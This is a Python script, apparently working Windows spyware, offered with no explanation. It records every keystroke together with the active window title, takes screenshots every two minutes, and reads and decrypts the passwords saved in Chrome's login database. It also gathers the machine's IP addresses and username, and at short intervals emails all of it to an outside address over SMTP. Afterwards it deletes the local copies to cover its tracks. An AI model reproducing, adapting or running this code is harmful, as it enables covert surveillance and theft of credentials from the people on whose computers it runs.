from pynput.keyboard import Key, Listener
import time
import os
import win32gui
import random
import threading
import requests
import yagmail
import socket
import pyautogui
import sqlite3
import win32crypt


def getInfo():

    publicIp = requests.get("https://api.ipify.org").text
    privateIp = socket.gethostbyname(socket.gethostname())
    user = os.path.expanduser("~").split("\\")[2]
    datetime = time.ctime(time.time())

    info = ("Public Ip - " + str(publicIp) + ", Private Ip - " + str(privateIp)
            + ", User - " + str(user) + ", DateTime - " + str(datetime) + "\n")

    return info

def on_press(key):
    global oldApp
    global loggedData

    
    app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if app != oldApp:
        loggedData.append("\n" + "New App - " + app + "\n")
        oldApp = app

    key = str(key).strip('\'')
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', 'Key.shift_r', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]', 'Key.up', '[UP]']

    if key in substitution:
        loggedData.append(substitution[substitution.index(key)+1])
    else:
        loggedData.append(key)

def saveData():
    global loggedData
    global logsPath
    
    while True:
        time.sleep(120)
        file = logsPath + "logs.txt"

        try:
            with open(file, "r") as f:
                current = f.readlines()

            current.append("\n\nNEXT LOG\n\n")
            current.extend(loggedData)
        except:
            current = loggedData
        
        with open(file, "w+") as f:
            f.write("".join(current))

        loggedData = [getInfo()]

def getPasswords():
    global logsPath
    dBPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    while True:
        connection = sqlite3.connect(dBPath)
        cursor = connection.cursor()
        statement = "SELECT origin_url,username_value,password_value FROM logins"
        accounts = []
        try:
            cursor.execute(statement)
            data=cursor.fetchall()
            for url, username, password in data:
                try:
                    password = win32crypt.CryptUnprotectData(password)
                    acc = str(url) + ", " + str(username) + ", " + str(password[1].decode("utf-8") + "\n")
                    accounts.append(acc)        
                except Exception as e: pass # Error 87, wrong encryption
        except sqlite3.OperationalError: pass # print("Google is open")
        file = logsPath + "passwords.txt"
        with open(file, "w+") as f:
            for account in accounts:
                f.write(account)
        time.sleep(1200)

def takeScreenShot():
    global logsPath
    count = 0

    while True:
        try:
            filename = str(count) + "-" + str(random.randint(1000, 9999)) + ".png"
            ss = pyautogui.screenshot()
            ss.save(logsPath + filename)

            count += 1
            time.sleep(120)
        except: pass

def sendData():
    global oldApp
    global logsPath
    global email
    global password
    yag = yagmail.SMTP(email, password)
    time.sleep(10)

    while True:
        attachments = os.listdir(logsPath)
        attachments = [logsPath + x for x in attachments]
        yag.send(email, 'Logs', attachments)
        oldApp = ""

        for file in attachments:
            os.remove(file)
        time.sleep(100)

oldApp = ""
loggedData = []
loggedData.append(getInfo())
logsPath = os.path.expanduser('~') + "\\logs\\"
email = "random@email.com"
password = "Password123"

if not os.path.exists(logsPath):
    os.makedirs(logsPath)

thread1 = threading.Thread(target=saveData)
thread1.start()
thread2 = threading.Thread(target=sendData)
thread2.start()
thread3 = threading.Thread(target=takeScreenShot)
thread3.start()
thread4 = threading.Thread(target=getPasswords)
thread4.start()

with Listener(on_press=on_press) as listener:
    listener.join()

